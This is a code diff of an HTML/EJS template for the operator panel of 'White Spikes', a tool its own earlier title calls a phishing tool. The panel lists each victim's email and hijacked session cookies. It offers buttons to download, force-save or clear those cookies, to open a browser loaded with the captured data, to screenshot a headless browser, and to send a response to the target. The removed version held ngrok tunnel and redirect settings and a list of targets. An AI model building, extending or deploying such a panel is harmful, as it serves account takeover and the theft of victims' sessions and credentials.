@@ -4,109 +4,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>White Spikes DASHBOARD | Pishing Tool</title>
-    <link rel="stylesheet" href="./assets/css/main.css">
-    <link rel="stylesheet" href="./assets/css/panel.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.js"
-        integrity="sha512-xbQU0+iHqhVt7VIXi6vBJKPh3IQBF5B84sSHdjKiSccyX/1ZI7Vnkt2/8y8uruj63/DVmCxfUNohPNruthTEQA=="
+    <title>Panel | WHITE SPIKES</title>
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/panel.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.js"
+        integrity="sha512-tE1z+95+lMCGwy+9PnKgUSIeHhvioC9lMlI7rLWU0Ps3XTdjRygLcy4mLuL0JAoK4TLdQEyP0yOl/9dMOqpH/Q=="
         crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-    <script src="./assets/js/panel-b.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.5/axios.min.js"
+        integrity="sha512-TjBzDQIDnc6pWyeM1bhMnDxtWH0QpOXMcVooglXrali/Tj7W569/wd4E8EDjk1CwOAOPSJon1VfcEt1BI4xIrA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <script>
+        let ID = `<%- data.id %>`
+        let appName = `<%- data.appName %>`
+    </script>
+    <script src="/assets/js/main.js" defer></script>
+    <script src="/assets/js/panel.js" defer></script>
 </head>
 
 <body>
-    <header class="header">
-        <div class="left">
-            <h2><b>@</b>White<span>Spikes</span></h2>
-            <h6>- Created by Madhan</h6>
+
+    <div class="main-container">
+        <div class="main-header">
+            <div class="left">
+                <a href="https://madhanmaaz.netlify.app" target="_blank" rel="noopener noreferrer">
+                    <h2><b>@</b>White<span>Spikes</span></h2>
+                    <h6>- Created by Madhan</h6>
+                </a>
+            </div>
+
+            <div class="right">
+                <a id="response-btn">
+                    <button class="b-btn" title="Response to target">
+                        <i class="fa-solid fa-reply"></i>
+                    </button>
+                </a>
+
+                <a id="database-btn">
+                    <button class="b-btn" title="Database">
+                        <i class="fa-solid fa-database"></i>
+                    </button>
+                </a>
+
+                <a id="open-browser-btn">
+                    <button class="b-btn" title="Open Data Browser">
+                        <i class="fa-brands fa-chrome"></i>
+                    </button>
+                </a>
+
+                <a href="/panel/download-cookies?id=<%- data.id %>" download="<%- data.id %>.wszip">
+                    <button class="b-btn" title="Download Cookies">
+                        <i class="fa-solid fa-cookie-bite"></i>
+                    </button>
+                </a>
+
+                <a id="take-screenshot">
+                    <button class="b-btn" title="take screenshot to view the headless browser">
+                        <i class="fa-solid fa-image"></i>
+                    </button>
+                </a>
+
+                <a href="/">
+                    <button class="b-btn" title="Home">
+                        <i class="fa-solid fa-house"></i>
+                    </button>
+                </a>
+            </div>
         </div>
 
-        <div class="right">
-            <h4>
-                <pre>TOOL</pre>
-            </h4>
-            <select id="tools">
-                <option value="none">none</option>
-                <% for(let i of modules) { %>
-                    <option value="<%- i %>"><%- i %></option>
-                    <% } %>
-            </select>
-            <button id="link-btn" class="btn">
-                <i class="fa-solid fa-link"></i>
-            </button>
-            <button class="btn" title="configuration tab" id="config-btn">
-                <i class="fa-solid fa-gear"></i>
-            </button>
-            <button class="btn" title="targets" id="targets-btn">
-                <i class="fa-solid fa-users-viewfinder"></i>
-            </button>
-            <a href="/logout">
-                <button class="btn">
-                    <i class="fa-solid fa-arrow-right-from-bracket"></i>
-                </button>
-            </a>
-        </div>
-    </header>
+        <div class="main-content">
+            <div class="info active">
+                <div class="left">
+                    <h4 class="sub">INFORMATION</h4>
+                    <pre>ID      : <%- data.id %></pre>
+                    <pre>EMAIL   : <%- data.email %></pre>
+                    <pre>APPNAME : <%- data.appName %></pre>
+                    <pre id="tar-<%- data.id %>-cookies">COOKIES : <%- data.cookies %></pre>
+                    <pre>OPTIONS : <button id="force-cookies" class="b-btn" title="force to save cookies"><i class="fa-solid fa-stroopwafel"></i></button> <button id="clear-cookies" class="b-btn" title="clear hijacked cookies"><i class="fa-solid fa-trash"></i></button></pre>
+                </div>
 
-    <div class="content">
-        <div class="terminal-box">
+                <div class="right" id="mini-log-container">
+                    <h4 class="sub">logs</h4>
 
+                </div>
+            </div>
+
+            <div class="terminal-box"></div>
         </div>
+
     </div>
 
-    <div class="config-tab">
+    <section class="dialog database-container">
         <div class="head">
-            <h2>configuration</h2>
-            <button class="btn" id="config-tab-close"><i class="fa-solid fa-xmark"></i></button>
-        </div>
-        <form>
-            <h2>app config</h2>
-            <div class="inp">
-                <label>token</label>
-                <input type="text" name="ngrokToken" value="<%- data.ngrokToken %>" required>
-            </div>
-            <div class="inp">
-                <label>browser</label>
-                <input type="text" name="browser" value="<%- data.browser %>" required>
-            </div>
+            <h3>Database</h3>
 
-            <h2>redirects</h2>
-            <div class="redirects">
-                <% for(let key in data["redirects"]) {%>
-                    <div class="inp">
-                        <label><%- key %></label>
-                        <input data-redirects="true" type="text" placeholder="https://example.com"
-                            value="<%- data['redirects'][key] %>" name="<%- key %>" required>
-                    </div>
-                    <% } %>
-            </div>
-
-            <h2></h2>
-
-
-            <div class="inp" style="display: block;">
-                <button class="btn" type="submit">SET</button>
-            </div>
-        </form>
-    </div>
-
-    <div class="targets-tab">
-        <div class="head">
-            <h2>targets</h2>
-            <div style="display: flex;align-items: center;gap: .4rem;">
-                <pre>Delete All: </pre>
-                <button class="btn" title="delete all targets" id="delete-all-targets">
-                    <i class="fa-regular fa-trash-can"></i>
+            <div class="left">
+                <button class="b-btn">
+                    <i class="fa-solid fa-xmark"></i>
                 </button>
-
-                <button class="btn" id="targets-close-btn"><i class="fa-solid fa-xmark"></i></button>
             </div>
         </div>
 
-        <div class="content">
+        <div class="content"></div>
+    </section>
 
+    <section class="dialog response-container">
+        <div class="head">
+            <h3>Response to target</h3>
+
+            <div class="left">
+                <button class="b-btn" id="response-setter">
+                    <i class="fa-solid fa-check"></i>
+                </button>
+                <button class="b-btn">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
         </div>
-    </div>
+
+        <textarea class="content" placeholder="Response...." id="response-input"><%- data.response %></textarea>
+    </section>
+
+    <section class="dialog screenshot-container">
+        <div class="head">
+            <h3>Screenshot</h3>
+
+            <div class="left">
+                <button class="b-btn">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+        </div>
+
+        <img alt="screenshot failed to load" src="assets/src/banner.jpg">
+    </section>
 </body>
 
 </html>
